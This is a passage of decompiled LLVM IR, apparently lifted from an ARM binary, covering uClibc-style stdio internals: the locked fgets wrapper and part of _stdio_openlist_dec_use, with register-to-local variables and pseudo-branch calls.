  %stack_var_-32 = alloca i32, align 4
  %v3_1fd6c = load i32, i32* @r4, align 4
  store i32 %v3_1fd6c, i32* %stack_var_-32, align 4
  %v6_1fd6c = load i32, i32* @r5, align 4
  %v9_1fd6c = load i32, i32* @r6, align 4
  %v12_1fd6c = load i32, i32* @r7, align 4
  %v15_1fd6c = load i32, i32* @r8, align 4
  %v24_1fd6c = load i32, i32* @lr, align 4
  %v1_1fd70 = add i32 %arg3, 52
  %v2_1fd70 = inttoptr i32 %v1_1fd70 to i32*
  %v3_1fd70 = load i32, i32* %v2_1fd70, align 4
  store i32 %v3_1fd70, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fd74 = icmp eq i32 %v3_1fd70, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_1fd74, label %dec_label_pc_1fd88, label %dec_label_pc_1fdec

dec_label_pc_1fd88:                               ; preds = %entry
  %v0_1fd88 = call i32 @__aeabi_read_tp()
  %v1_1fd8c = add i32 %arg3, 64
  %v2_1fd8c = inttoptr i32 %v1_1fd8c to i32*
  %v3_1fd8c = load i32, i32* %v2_1fd8c, align 4
  store i32 %v3_1fd8c, i32* %r3.global-to-local, align 4
  %v1_1fd90 = add i32 %v0_1fd88, -1168
  store i32 %v1_1fd90, i32* @r8, align 4
  %v3_1fd94 = icmp uge i32 %v3_1fd8c, %v1_1fd90
  store i1 %v3_1fd94, i1* %cpsr_c.global-to-local, align 1
  %v9_1fd94 = icmp eq i32 %v3_1fd8c, %v1_1fd90
  br i1 %v9_1fd94, label %dec_label_pc_1fde0, label %dec_label_pc_1fd9c

dec_label_pc_1fd9c:                               ; preds = %dec_label_pc_1fd88
  %v1_1fd9c = add i32 %arg3, 56
  store i32 %v1_1fd9c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1fd9c, i32* %r2.global-to-local, align 4
  %v0_1fda8 = load i32, i32* @r6, align 4
  store i32 %v0_1fda8, i32* @r4, align 4
  %v1_1fdac36 = inttoptr i32 %v1_1fd9c to i32*
  %v2_1fdac37 = load i32, i32* %v1_1fdac36, align 4
  store i32 %v2_1fdac37, i32* %r3.global-to-local, align 4
  %v3_1fdb039 = icmp uge i32 %v2_1fdac37, %v0_1fda8
  store i1 %v3_1fdb039, i1* %cpsr_c.global-to-local, align 1
  %v9_1fdb045 = icmp eq i32 %v2_1fdac37, %v0_1fda8
  br i1 %v9_1fdb045, label %dec_label_pc_1fdb8, label %dec_label_pc_1fdd0

dec_label_pc_1fdb8:                               ; preds = %dec_label_pc_1fd9c, %dec_label_pc_1fdb8.dec_label_pc_1fdac_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1fdc8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1fdc8, label %dec_label_pc_1fdcc, label %dec_label_pc_1fdb8.dec_label_pc_1fdac_crit_edge

dec_label_pc_1fdb8.dec_label_pc_1fdac_crit_edge:  ; preds = %dec_label_pc_1fdb8
  %v0_1fdac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1fdb0.pre = load i32, i32* @r4, align 4
  %v1_1fdac = inttoptr i32 %v0_1fdac.pre to i32*
  %v2_1fdac = load i32, i32* %v1_1fdac, align 4
  store i32 %v2_1fdac, i32* %r3.global-to-local, align 4
  %v3_1fdb0 = icmp uge i32 %v2_1fdac, %v1_1fdb0.pre
  store i1 %v3_1fdb0, i1* %cpsr_c.global-to-local, align 1
  %v9_1fdb0 = icmp eq i32 %v2_1fdac, %v1_1fdb0.pre
  br i1 %v9_1fdb0, label %dec_label_pc_1fdb8, label %dec_label_pc_1fdd0

dec_label_pc_1fdcc:                               ; preds = %dec_label_pc_1fdb8
  %v0_1fdcc = load i32, i32* @r4, align 4
  store i32 %v0_1fdcc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1fdd0

dec_label_pc_1fdd0:                               ; preds = %dec_label_pc_1fd9c, %dec_label_pc_1fdb8.dec_label_pc_1fdac_crit_edge, %dec_label_pc_1fdcc
  %v0_1fdd0 = phi i32 [ %v0_1fdcc, %dec_label_pc_1fdcc ], [ %v2_1fdac37, %dec_label_pc_1fd9c ], [ %v2_1fdac, %dec_label_pc_1fdb8.dec_label_pc_1fdac_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fdd0 = icmp eq i32 %v0_1fdd0, 0
  br i1 %v2_1fdd0, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_1fdd0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_1fdd0, %bb
  store i32 130524, i32* @lr, align 4
  %v1_1fdd8 = xor i1 %v2_1fdd0, true
  call void @__pseudo_cond_branch(i1 %v1_1fdd8, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1fddc = load i32, i32* @r8, align 4
  %v1_1fddc = load i32, i32* @r7, align 4
  %v2_1fddc = add i32 %v1_1fddc, 64
  %v3_1fddc = inttoptr i32 %v2_1fddc to i32*
  store i32 %v0_1fddc, i32* %v3_1fddc, align 4
  br label %dec_label_pc_1fde0

dec_label_pc_1fde0:                               ; preds = %dec_label_pc_1fd88, %bb20
  %v0_1fde0 = load i32, i32* @r7, align 4
  %v1_1fde0 = add i32 %v0_1fde0, 60
  %v2_1fde0 = inttoptr i32 %v1_1fde0 to i32*
  %v3_1fde0 = load i32, i32* %v2_1fde0, align 4
  %v1_1fde4 = add i32 %v3_1fde0, 1
  store i32 %v1_1fde4, i32* %r3.global-to-local, align 4
  store i32 %v1_1fde4, i32* %v2_1fde0, align 4
  %v0_1fdec.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_1fdf0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_1fdf4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1fdec

dec_label_pc_1fdec:                               ; preds = %entry, %dec_label_pc_1fde0
  %v0_1fdf4 = phi i32 [ %arg3, %entry ], [ %v0_1fdf4.pre, %dec_label_pc_1fde0 ]
  %v0_1fdf0 = phi i32 [ %arg2, %entry ], [ %v0_1fdf0.pre, %dec_label_pc_1fde0 ]
  %v0_1fdec = phi i32 [ %arg1, %entry ], [ %v0_1fdec.pre, %dec_label_pc_1fde0 ]
  store i32 %v0_1fdf0, i32* %r1.global-to-local, align 4
  store i32 %v0_1fdf4, i32* %r2.global-to-local, align 4
  %v3_1fdf8 = inttoptr i32 %v0_1fdec to i8*
  %v4_1fdf8 = call i32 @__GI_fgets_unlocked(i8* %v3_1fdf8, i32 %v0_1fdf0, i32 %v0_1fdf4)
  %v0_1fdfc = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fdfc = icmp eq i32 %v0_1fdfc, 0
  store i32 %v4_1fdf8, i32* %r8.global-to-local, align 4
  br i1 %v2_1fdfc, label %dec_label_pc_1fe08, label %dec_label_pc_1fe7c

dec_label_pc_1fe08:                               ; preds = %dec_label_pc_1fdec
  %v0_1fe08 = load i32, i32* @r7, align 4
  %v1_1fe08 = add i32 %v0_1fe08, 60
  %v2_1fe08 = inttoptr i32 %v1_1fe08 to i32*
  %v3_1fe08 = load i32, i32* %v2_1fe08, align 4
  %v1_1fe0c = add i32 %v3_1fe08, -1
  store i32 %v1_1fe0c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fe10 = icmp eq i32 %v1_1fe0c, 0
  store i32 %v1_1fe0c, i32* %v2_1fe08, align 4
  br i1 %v2_1fe10, label %dec_label_pc_1fe1c, label %dec_label_pc_1fe7c

dec_label_pc_1fe1c:                               ; preds = %dec_label_pc_1fe08
  %v0_1fe1c = load i32, i32* %r3.global-to-local, align 4
  %v1_1fe1c = load i32, i32* @r7, align 4
  %v2_1fe1c = add i32 %v1_1fe1c, 64
  %v3_1fe1c = inttoptr i32 %v2_1fe1c to i32*
  store i32 %v0_1fe1c, i32* %v3_1fe1c, align 4
  %v0_1fe20 = load i32, i32* @r7, align 4
  %v1_1fe20 = add i32 %v0_1fe20, 56
  store i32 %v1_1fe20, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1fe24

dec_label_pc_1fe24:                               ; preds = %dec_label_pc_1fe54.dec_label_pc_1fe24_crit_edge, %dec_label_pc_1fe1c
  %v0_1fe2c = phi i32 [ %v0_1fe2c.pre, %dec_label_pc_1fe54.dec_label_pc_1fe24_crit_edge ], [ %v1_1fe20, %dec_label_pc_1fe1c ]
  %v0_1fe24 = phi i32 [ %v0_1fe24.pre, %dec_label_pc_1fe54.dec_label_pc_1fe24_crit_edge ], [ %v0_1fe20, %dec_label_pc_1fe1c ]
  %v1_1fe24 = add i32 %v0_1fe24, 56
  %v2_1fe24 = inttoptr i32 %v1_1fe24 to i32*
  %v3_1fe24 = load i32, i32* %v2_1fe24, align 4
  store i32 %v3_1fe24, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1fe2c, i32* %r2.global-to-local, align 4
  %v1_1fe3024 = inttoptr i32 %v0_1fe2c to i32*
  %v2_1fe3025 = load i32, i32* %v1_1fe3024, align 4
  store i32 %v2_1fe3025, i32* %r3.global-to-local, align 4
  %v3_1fe3427 = icmp uge i32 %v2_1fe3025, %v3_1fe24
  store i1 %v3_1fe3427, i1* %cpsr_c.global-to-local, align 1
  %v9_1fe3433 = icmp eq i32 %v2_1fe3025, %v3_1fe24
  br i1 %v9_1fe3433, label %dec_label_pc_1fe3c, label %dec_label_pc_1fe54

dec_label_pc_1fe3c:                               ; preds = %dec_label_pc_1fe24, %dec_label_pc_1fe3c.dec_label_pc_1fe30_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1fe4c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1fe4c, label %dec_label_pc_1fe50, label %dec_label_pc_1fe3c.dec_label_pc_1fe30_crit_edge

dec_label_pc_1fe3c.dec_label_pc_1fe30_crit_edge:  ; preds = %dec_label_pc_1fe3c
  %v0_1fe30.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1fe34.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1fe30 = inttoptr i32 %v0_1fe30.pre to i32*
  %v2_1fe30 = load i32, i32* %v1_1fe30, align 4
  store i32 %v2_1fe30, i32* %r3.global-to-local, align 4
  %v3_1fe34 = icmp uge i32 %v2_1fe30, %v1_1fe34.pre
  store i1 %v3_1fe34, i1* %cpsr_c.global-to-local, align 1
  %v9_1fe34 = icmp eq i32 %v2_1fe30, %v1_1fe34.pre
  br i1 %v9_1fe34, label %dec_label_pc_1fe3c, label %dec_label_pc_1fe54

dec_label_pc_1fe50:                               ; preds = %dec_label_pc_1fe3c
  %v0_1fe50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1fe50, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1fe54

dec_label_pc_1fe54:                               ; preds = %dec_label_pc_1fe24, %dec_label_pc_1fe3c.dec_label_pc_1fe30_crit_edge, %dec_label_pc_1fe50
  %v0_1fe5c = phi i32 [ %v0_1fe50, %dec_label_pc_1fe50 ], [ %v2_1fe3025, %dec_label_pc_1fe24 ], [ %v2_1fe30, %dec_label_pc_1fe3c.dec_label_pc_1fe30_crit_edge ]
  %v1_1fe54 = phi i32 [ %v0_1fe50, %dec_label_pc_1fe50 ], [ %v3_1fe24, %dec_label_pc_1fe24 ], [ %v1_1fe34.pre, %dec_label_pc_1fe3c.dec_label_pc_1fe30_crit_edge ]
  %v3_1fe54 = icmp uge i32 %v0_1fe5c, %v1_1fe54
  store i1 %v3_1fe54, i1* %cpsr_c.global-to-local, align 1
  %v9_1fe54 = icmp eq i32 %v0_1fe5c, %v1_1fe54
  br i1 %v9_1fe54, label %dec_label_pc_1fe5c, label %dec_label_pc_1fe54.dec_label_pc_1fe24_crit_edge

dec_label_pc_1fe54.dec_label_pc_1fe24_crit_edge:  ; preds = %dec_label_pc_1fe54
  %v0_1fe24.pre = load i32, i32* @r7, align 4
  %v0_1fe2c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1fe24

dec_label_pc_1fe5c:                               ; preds = %dec_label_pc_1fe54
  %v2_1fe5c = icmp ne i32 %v1_1fe54, 0
  store i1 %v2_1fe5c, i1* %cpsr_c.global-to-local, align 1
  %v7_1fe60 = icmp slt i32 %v1_1fe54, 2
  br i1 %v7_1fe60, label %dec_label_pc_1fe7c, label %dec_label_pc_1fe64

dec_label_pc_1fe64:                               ; preds = %dec_label_pc_1fe5c
  %v0_1fe68 = load i32, i32* %r1.global-to-local, align 4
  %v1_1fe68 = add i32 %v0_1fe68, 129
  store i32 %v1_1fe68, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1fe7c

dec_label_pc_1fe7c:                               ; preds = %dec_label_pc_1fe08, %dec_label_pc_1fdec, %dec_label_pc_1fe64, %dec_label_pc_1fe5c
  %v0_1fe7c = load i32, i32* %r8.global-to-local, align 4
  %v2_1fe80 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1fe80, i32* %r4.global-to-local, align 4
  store i32 %v6_1fd6c, i32* @r5, align 4
  store i32 %v9_1fd6c, i32* @r6, align 4
  store i32 %v12_1fd6c, i32* @r7, align 4
  store i32 %v15_1fd6c, i32* @r8, align 4
  store i32 %v24_1fd6c, i32* @lr, align 4
  ret i32 %v0_1fe7c

; uselistorder directives
  uselistorder i32 %v0_1fe50, { 1, 0, 2 }
  uselistorder i32 %v1_1fe34.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1fdf0, { 1, 0 }
  uselistorder i32 %v0_1fdf4, { 1, 0 }
  uselistorder i32 %v1_1fdb0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 2, 1, 4, 3, 5 }
  uselistorder label %dec_label_pc_1fe7c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1fe54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1fe3c, { 1, 0 }
  uselistorder label %dec_label_pc_1fdec, { 1, 0 }
  uselistorder label %dec_label_pc_1fde0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1fdd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1fdb8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1fe88 = load i32, i32* @r4, align 4
  store i32 %v3_1fe88, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r5.global-to-local, align 4
  %v4_1fe98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 160) to i32*), align 4
  store i32 %v4_1fe98, i32* %r7.global-to-local, align 4
  %v0_1fe9c = call i32 @__aeabi_read_tp()
  store i32 %v0_1fe9c, i32* %r0.global-to-local, align 4
  %v1_1fea0 = add i32 %v4_1fe98, 8
  %v2_1fea0 = inttoptr i32 %v1_1fea0 to i32*
  %v3_1fea0 = load i32, i32* %v2_1fea0, align 4
  store i32 %v3_1fea0, i32* %r3.global-to-local, align 4
  %v1_1fea4 = add i32 %v0_1fe9c, -1168
  store i32 %v1_1fea4, i32* %r6.global-to-local, align 4
  %v3_1fea8 = icmp uge i32 %v3_1fea0, %v1_1fea4
  store i1 %v3_1fea8, i1* %cpsr_c.global-to-local, align 1
  %v9_1fea8 = icmp eq i32 %v3_1fea0, %v1_1fea4
  br i1 %v9_1fea8, label %dec_label_pc_1fef4, label %dec_label_pc_1feb4

dec_label_pc_1feb4:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1fe98, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1fec093 = inttoptr i32 %v4_1fe98 to i32*
  %v2_1fec094 = load i32, i32* %v1_1fec093, align 4
  store i32 %v2_1fec094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1fec496 = icmp eq i32 %v2_1fec094, 0
  br i1 %v9_1fec496, label %dec_label_pc_1fecc, label %dec_label_pc_1fee4

dec_label_pc_1fecc:                               ; preds = %dec_label_pc_1feb4, %dec_label_pc_1fecc.dec_label_pc_1fec0_crit_edge
  %v0_1fecc97 = phi i32 [ %v1_1fec4.pre, %dec_label_pc_1fecc.dec_label_pc_1fec0_crit_edge ], [ 0, %dec_label_pc_1feb4 ]
  store i32 %v0_1fecc97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1fedc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1fedc, label %dec_label_pc_1fee0, label %dec_label_pc_1fecc.dec_label_pc_1fec0_crit_edge

dec_label_pc_1fecc.dec_label_pc_1fec0_crit_edge:  ; preds = %dec_label_pc_1fecc
  %v0_1fec0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1fec4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1fec0 = inttoptr i32 %v0_1fec0.pre to i32*
  %v2_1fec0 = load i32, i32* %v1_1fec0, align 4
  store i32 %v2_1fec0, i32* %r3.global-to-local, align 4
  %v3_1fec4 = icmp uge i32 %v2_1fec0, %v1_1fec4.pre
  store i1 %v3_1fec4, i1* %cpsr_c.global-to-local, align 1
  %v9_1fec4 = icmp eq i32 %v2_1fec0, %v1_1fec4.pre
  br i1 %v9_1fec4, label %dec_label_pc_1fecc, label %dec_label_pc_1fee4

dec_label_pc_1fee0:                               ; preds = %dec_label_pc_1fecc
  %v0_1fee0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1fee0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1fee4

dec_label_pc_1fee4:                               ; preds = %dec_label_pc_1feb4, %dec_label_pc_1fecc.dec_label_pc_1fec0_crit_edge, %dec_label_pc_1fee0
  %v0_1fee4 = phi i32 [ %v0_1fee0, %dec_label_pc_1fee0 ], [ %v2_1fec094, %dec_label_pc_1feb4 ], [ %v2_1fec0, %dec_label_pc_1fecc.dec_label_pc_1fec0_crit_edge ]
  %v1_1fee4 = phi i32 [ %v0_1fee0, %dec_label_pc_1fee0 ], [ 0, %dec_label_pc_1feb4 ], [ %v1_1fec4.pre, %dec_label_pc_1fecc.dec_label_pc_1fec0_crit_edge ]
  %v3_1fee4 = icmp uge i32 %v0_1fee4, %v1_1fee4
  store i1 %v3_1fee4, i1* %cpsr_c.global-to-local, align 1
  %v9_1fee4 = icmp eq i32 %v0_1fee4, %v1_1fee4
  br i1 %v9_1fee4, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_1fee4
  %v1_1fee8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1fee8, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_1fee4, %bb
  %v1_1feec = xor i1 %v9_1fee4, true
  call void @__pseudo_cond_branch(i1 %v1_1feec, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1fef0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1fef0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1fef0 = add i32 %v1_1fef0, 8
  %v3_1fef0 = inttoptr i32 %v2_1fef0 to i32*
  store i32 %v0_1fef0, i32* %v3_1fef0, align 4
  br label %dec_label_pc_1fef4

dec_label_pc_1fef4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1fef8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1fef8 = add i32 %v0_1fef8, 160
  %v3_1fef8 = inttoptr i32 %v2_1fef8 to i32*
  %v4_1fef8 = load i32, i32* %v3_1fef8, align 4
  store i32 %v4_1fef8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1ff00 = add i32 %v0_1fef8, 12
  %v3_1ff00 = inttoptr i32 %v2_1ff00 to i32*
  %v4_1ff00 = load i32, i32* %v3_1ff00, align 4
  store i32 %v4_1ff00, i32* %r3.global-to-local, align 4
  %v1_1ff04 = inttoptr i32 %v4_1ff00 to i32*
  %v2_1ff04 = load i32, i32* %v1_1ff04, align 4
  store i32 %v2_1ff04, i32* %r1.global-to-local, align 4
  %v1_1ff08 = add i32 %v4_1fef8, 4
  %v2_1ff08 = inttoptr i32 %v1_1ff08 to i32*
  %v3_1ff08 = load i32, i32* %v2_1ff08, align 4
  %v2_1ff0c = icmp ne i32 %v2_1ff04, 0
  store i1 %v2_1ff0c, i1* %cpsr_c.global-to-local, align 1
  %v7_1ff0c = icmp eq i32 %v2_1ff04, 1
  %v1_1ff10 = add i32 %v3_1ff08, 1
  store i32 %v1_1ff10, i32* %r3.global-to-local, align 4
  store i32 %v1_1ff10, i32* %v2_1ff08, align 4
  br i1 %v7_1ff0c, label %dec_label_pc_1ff1c, label %dec_label_pc_20080

dec_label_pc_1ff1c:                               ; preds = %dec_label_pc_1fef4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_1ff20 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ff20 = add i32 %v0_1ff20, 80
  %v3_1ff20 = inttoptr i32 %v2_1ff20 to i32*
  %v4_1ff20 = load i32, i32* %v3_1ff20, align 4
  store i32 %v4_1ff20, i32* %r3.global-to-local, align 4
  %v1_1ff24 = inttoptr i32 %v4_1ff20 to i32*
  %v2_1ff24 = load i32, i32* %v1_1ff24, align 4
  store i32 %v2_1ff24, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_1ff24, 1
  br i1 %tmp46, label %dec_label_pc_20080, label %dec_label_pc_1ff30

dec_label_pc_1ff30:                               ; preds = %dec_label_pc_1ff1c
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_1ff34 = add i32 %v0_1ff20, 152
  %v3_1ff34 = inttoptr i32 %v2_1ff34 to i32*
  %v4_1ff34 = load i32, i32* %v3_1ff34, align 4
  store i32 %v4_1ff34, i32* %r7.global-to-local, align 4
  %v1_1ff38 = add i32 %v4_1ff34, 8
  %v2_1ff38 = inttoptr i32 %v1_1ff38 to i32*
  %v3_1ff38 = load i32, i32* %v2_1ff38, align 4
  store i32 %v3_1ff38, i32* %r3.global-to-local, align 4
  %v1_1ff3c = load i32, i32* %r6.global-to-local, align 4
  %v3_1ff3c = icmp uge i32 %v3_1ff38, %v1_1ff3c
  store i1 %v3_1ff3c, i1* %cpsr_c.global-to-local, align 1
  %v9_1ff3c = icmp eq i32 %v3_1ff38, %v1_1ff3c
  br i1 %v9_1ff3c, label %dec_label_pc_1ff80, label %dec_label_pc_1ff44

dec_label_pc_1ff44:                               ; preds = %dec_label_pc_1ff30
  store i32 %v4_1ff34, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1ff4c86 = inttoptr i32 %v4_1ff34 to i32*
  %v2_1ff4c87 = load i32, i32* %v1_1ff4c86, align 4
  store i32 %v2_1ff4c87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1ff5089 = icmp eq i32 %v2_1ff4c87, 0
  br i1 %v9_1ff5089, label %dec_label_pc_1ff58, label %dec_label_pc_1ff70

dec_label_pc_1ff58:                               ; preds = %dec_label_pc_1ff44, %dec_label_pc_1ff58.dec_label_pc_1ff4c_crit_edge
  %v0_1ff5890 = phi i32 [ %v1_1ff50.pre, %dec_label_pc_1ff58.dec_label_pc_1ff4c_crit_edge ], [ 0, %dec_label_pc_1ff44 ]
  store i32 %v0_1ff5890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1ff68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1ff68, label %dec_label_pc_1ff6c, label %dec_label_pc_1ff58.dec_label_pc_1ff4c_crit_edge

dec_label_pc_1ff58.dec_label_pc_1ff4c_crit_edge:  ; preds = %dec_label_pc_1ff58
  %v0_1ff4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ff50.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1ff4c = inttoptr i32 %v0_1ff4c.pre to i32*
  %v2_1ff4c = load i32, i32* %v1_1ff4c, align 4
  store i32 %v2_1ff4c, i32* %r3.global-to-local, align 4
  %v3_1ff50 = icmp uge i32 %v2_1ff4c, %v1_1ff50.pre
  store i1 %v3_1ff50, i1* %cpsr_c.global-to-local, align 1
  %v9_1ff50 = icmp eq i32 %v2_1ff4c, %v1_1ff50.pre
  br i1 %v9_1ff50, label %dec_label_pc_1ff58, label %dec_label_pc_1ff70

dec_label_pc_1ff6c:                               ; preds = %dec_label_pc_1ff58
  %v0_1ff6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1ff6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ff70

dec_label_pc_1ff70:                               ; preds = %dec_label_pc_1ff44, %dec_label_pc_1ff58.dec_label_pc_1ff4c_crit_edge, %dec_label_pc_1ff6c
  %v0_1ff70 = phi i32 [ %v0_1ff6c, %dec_label_pc_1ff6c ], [ %v2_1ff4c87, %dec_label_pc_1ff44 ], [ %v2_1ff4c, %dec_label_pc_1ff58.dec_label_pc_1ff4c_crit_edge ]
  %v1_1ff70 = phi i32 [ %v0_1ff6c, %dec_label_pc_1ff6c ], [ 0, %dec_label_pc_1ff44 ], [ %v1_1ff50.pre, %dec_label_pc_1ff58.dec_label_pc_1ff4c_crit_edge ]
  %v3_1ff70 = icmp uge i32 %v0_1ff70, %v1_1ff70
  store i1 %v3_1ff70, i1* %cpsr_c.global-to-local, align 1
  %v9_1ff70 = icmp eq i32 %v0_1ff70, %v1_1ff70
  br i1 %v9_1ff70, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_1ff70
  %v1_1ff74 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1ff74, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_1ff70, %bb47
  %v1_1ff78 = xor i1 %v9_1ff70, true
  call void @__pseudo_cond_branch(i1 %v1_1ff78, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1ff7c = load i32, i32* %r6.global-to-local, align 4
  %v1_1ff7c = load i32, i32* %r7.global-to-local, align 4
  %v2_1ff7c = add i32 %v1_1ff7c, 8
  %v3_1ff7c = inttoptr i32 %v2_1ff7c to i32*
  store i32 %v0_1ff7c, i32* %v3_1ff7c, align 4
  %v0_1ff88.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1ff80

dec_label_pc_1ff80:                               ; preds = %dec_label_pc_1ff30, %bb48
  %v0_1ff88 = phi i32 [ %v0_1ff20, %dec_label_pc_1ff30 ], [ %v0_1ff88.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_1ff88 = add i32 %v0_1ff88, 152
  %v3_1ff88 = inttoptr i32 %v2_1ff88 to i32*
  %v4_1ff88 = load i32, i32* %v3_1ff88, align 4
  store i32 %v4_1ff88, i32* %r0.global-to-local, align 4
  %v2_1ff8c = add i32 %v0_1ff88, 76
  %v3_1ff8c = inttoptr i32 %v2_1ff8c to i32*
  %v4_1ff8c = load i32, i32* %v3_1ff8c, align 4
  store i32 %v4_1ff8c, i32* %r2.global-to-local, align 4
  %v1_1ff90 = add i32 %v4_1ff88, 4
  %v2_1ff90 = inttoptr i32 %v1_1ff90 to i32*
  %v3_1ff90 = load i32, i32* %v2_1ff90, align 4
  store i32 %v3_1ff90, i32* %r3.global-to-local, align 4
  %v1_1ff94 = inttoptr i32 %v4_1ff8c to i32*
  %v2_1ff94 = load i32, i32* %v1_1ff94, align 4
  store i32 %v2_1ff94, i32* %r2.global-to-local, align 4
  %v1_1ff98 = add i32 %v3_1ff90, 1
  store i32 %v1_1ff98, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_1ff98, i32* %v2_1ff90, align 4
  %v0_1ffe8.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ffe811 = icmp eq i32 %v0_1ffe8.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_1ffe811, label %dec_label_pc_1fff4, label %dec_label_pc_1ffac

